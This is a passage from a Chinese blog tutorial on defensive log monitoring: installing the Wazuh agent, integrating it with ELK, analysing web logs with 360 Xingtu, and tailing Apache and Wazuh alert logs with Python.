<p><img src="https://images2.imgbox.com/88/9b/l4QLCcnh_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="linux_2230"></a>linux</h3> 
<pre><code>rpm --import https://packages.wazuh.com/key/GPG-KEY-WAZUH
</code></pre> 
<pre><code>cat &gt; /etc/yum.repos.d/wazuh.repo &lt;&lt; EOF
[wazuh]
gpgcheck=1
gpgkey=https://packages.wazuh.com/key/GPG-KEY-WAZUH
enabled=1
name=EL-\$releasever - Wazuh
baseurl=https://packages.wazuh.com/4.x/yum/
protect=1
EOF
</code></pre> 
<pre><code>yum install wazuh-agent
systemctl enable wazuh-agent
</code></pre> 
<p>跟windows同样的操作</p> 
<pre><code>vim /var/ossec/etc/ossec.conf
</code></pre> 
<pre><code>    &lt;server&gt;
      &lt;address&gt;192.168.174.6&lt;/address&gt;
      &lt;port&gt;1514&lt;/port&gt;
      &lt;protocol&gt;tcp&lt;/protocol&gt;
    &lt;/server&gt;
</code></pre> 
<p>同样频率调为10</p> 
<p><img src="https://images2.imgbox.com/13/52/byr5ajfX_o.png" alt="在这里插入图片描述"></p> 
<p>需要执行命令导入Key，这次选项选I输入key就好了</p> 
<pre><code>/var/ossec/bin/manage_agents
</code></pre> 
<p>开启</p> 
<pre><code>systemctl start wazuh-agent
</code></pre> 
<h2><a id="ELK_2302"></a>集成ELK</h2> 
<p>在首页下载ova直接导入vmware</p> 
<p>虚拟机密码为</p> 
<pre><code>user: wazuh-user
password: wazuh
</code></pre> 
<p>访问</p> 
<pre><code>https://192.168.174.6
user: admin
password: admin
</code></pre> 
<p><img src="https://images2.imgbox.com/0d/08/joAlwgfr_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/74/41/9malm6Zg_o.png" alt="在这里插入图片描述"></p> 
<p>agent客户端添加一个账号都是可以看到的</p> 
<p><img src="https://images2.imgbox.com/04/4b/qLx6OAXh_o.png" alt="在这里插入图片描述"></p> 
<p>我们来个登录失败的</p> 
<p><img src="https://images2.imgbox.com/9c/c0/PWgs02Hi_o.png" alt="在这里插入图片描述"></p> 
<p>界面可以看到</p> 
<p><img src="https://images2.imgbox.com/cb/d0/kB3Kykt9_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/1c/5b/Ws6YmDtH_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="360_2367"></a>360星图</h2> 
<p>对web日志，apache，iis等进行离线分析，要有java环境</p> 
<p>配置文件</p> 
<p><img src="https://images2.imgbox.com/f4/51/kGjHBfVx_o.png" alt="在这里插入图片描述"></p> 
<p>准备一个日志文件</p> 
<p><img src="https://images2.imgbox.com/85/64/AkukIe9c_o.png" alt="在这里插入图片描述"></p> 
<p>在config.ini中改成这个文件的路径</p> 
<p><img src="https://images2.imgbox.com/f1/aa/BZvQhda7_o.png" alt="在这里插入图片描述"></p> 
<p>运行start.bat</p> 
<p><img src="https://images2.imgbox.com/d4/67/DQ6oPTpO_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/54/95/9jXYT7JP_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/dc/1f/2ERgnjZ4_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="python_2417"></a>python实时读取日志</h2> 
<h3><a id="_2421"></a>实时读取日志</h3> 
<pre><code>'''
file = open("test.py")
print(file.tell())

# 文件指针到末尾
file.seek(0, 2)

print("文件共" + str(file.tell()) + "个字节")
# 文件指针到开头
file.seek(0, 0)
content = file.read(100)
print(content)
print(file.tell())
file.close()
'''
import re
import time

filename = "E:/soft/xampp/file/apache/logs/access.log"

'''
192.168.2.99 - - [08/Mar/2023:17:53:08 +0800] "GET /phpinfo.php HTTP/1.1" 404 6851 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
'''

# 打开日志文件
file = open(filename)
# 移动到日志末尾
file.seek(0, 2)
list_all = []

# 死循环
while True:
    print("-----正在读取文件-----")
    # 调用readlines时指针会指向末尾
    line_list = file.readlines()
    # 如果大于零说明日志更新了，读到了
    if len(line_list) &gt; 0:
        for line in line_list:
            print(line)
            pattern = '([\d\.]+) - - \[(\S+) \+0800\] "(\w+) (\S+) HTTP/1.1" (\d+) (\d+) "(\S+)" "([\S|\s]+)"'
            list = re.findall(pattern, line)
            srcip = list[0][0]
            access_time = list[0][1]
            method = list[0][2]
            url = list[0][3]
            status_code = list[0][4]
            resp_size = list[0][5]
            referer = list[0][6]
            user_agent = list[0][7]

            dict = {}
            dict['srcip'] = srcip
            dict['access_time'] = access_time
            dict['method'] = method
            dict['url'] = url
            dict['status_code'] = status_code
            dict['resp_size'] = resp_size
            dict['referer'] = referer
            dict['user_agent'] = user_agent
            # print(srcip, access_time, method, url, status_code, resp_size, referer, user_agent)
            list_all.append(dict)
        print(list_all)
    time.sleep(5)
</code></pre> 
<h3><a id="wazuhalertjson_2491"></a>处理wazuh的alert.json</h3> 
<p>拷贝一个wazuh的alert.log中的一行告警</p> 
<pre><code>{"timestamp":"2023-03-07T15:35:34.651+0800","rule":{"level":5,"description":"Web server 404 error code.","id":"31101","firedtimes":3,"mail":false,"groups":["web_log","attack"],"pci_dss":["6.5","11.4"],"gdpr":["IV_35.7.d"],"nist_800_53":["SA.11","SI.4"],"tsc":["CC6.6","CC7.1","CC8.1","CC6.1","CC6.8","CC7.2","CC7.3"]},"agent":{"id":"000","name":"localhost.localdomain"},"manager":{"name":"localhost.localdomain"},"id":"1678174534.81648","full_log":"192.168.174.1 - - [07/Mar/2023:15:35:34 +0800] GET /user/reg.php111 HTTP/1.1 404 1034","decoder":{"name":"web-accesslog"},"data":{"protocol":"GET","srcip":"192.168.174.1","id":"404","url":"/user/reg.php111"},"location":"/opt/lampp/logs/access_log"}
</code></pre> 
<p>vscode安装pylance及python插件</p> 
<p><img src="https://images2.imgbox.com/e7/ad/VMtPx9o6_o.png" alt="在这里插入图片描述"></p> 
<p>linux下python3</p> 
<pre><code>https://blog.csdn.net/weixin_53060366/article/details/125828328
</code></pre> 
<pre><code>from datetime import datetime
import time
import json

filename = "/var/ossec/logs/alerts/alerts.json"
file = open(r'/var/ossec/logs/alerts/alerts.json')

file.seek(0, 2)

while True:
    line_list = file.readlines()
    if line_list == 0:
        continue

    for line in line_list:
        data = json.loads(line.strip())

        timestamp = datetime.strptime(data['timestamp'], '%Y-%m-%dT%H:%M:%S.%f+0800')
        level = data['rule']['level']
        description = data['rule']['description']
        ruleid = data['rule']['id']
        firedtimes = data['rule']['firedtimes']
        agent = data['agent']
        full_log = data['full_log']
        srcip = data['data']['srcip'] if 'srcip' in data['data'].keys() else ''


        print('timestamp : ' + str(timestamp))
        print('level : ' + str(level))
        print('ruleid : ' + str(ruleid))
        print('firedtimes : ' + str(firedtimes))
        print('srcip : ' + str(srcip))
        print('agent : ' + str(agent))
        print('description : ' + str(description))
        print('full_log : ' + str(full_log))
        print("\n")

    time.sleep(5)
</code></pre> 
<p><img src="https://images2.imgbox.com/4b/d6/09fPk5zt_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/b3/9d/SK0xrHo6_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="wazuh_2581"></a>wazuh能帮我们解决的问题？</h2> 
<pre><code>1.监控。在各个服务器上部署agent进行信息的获取信息来源，主要分为日志和命令执行的结果，从这一点看出，hids还是偏事后的，很显然攻击已经发生，有了日志或者命令结果的记录，hids才会进行后续的操作，所以wazuh也可以充当seim
1.1监控各个配置的目录
1.2监控配置命令的执行结果
2.解码器。根据正则/json获取需要的日志，包括提取ip，用户名等等
3.规则。根据解码器获取的日志与规则进行匹配
4.响应。根据规则结果进行host_deny或者firewall_drop
</code></pre>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/f9aaff5e043acf4c2f93b027d9a36c3d/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">新版IDEA(2022.3)配置热部署</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/3a1b400a501210e8ef7cee4032b3d119/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">vue页面跳转传值和获取路径中的参数的两种形式</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>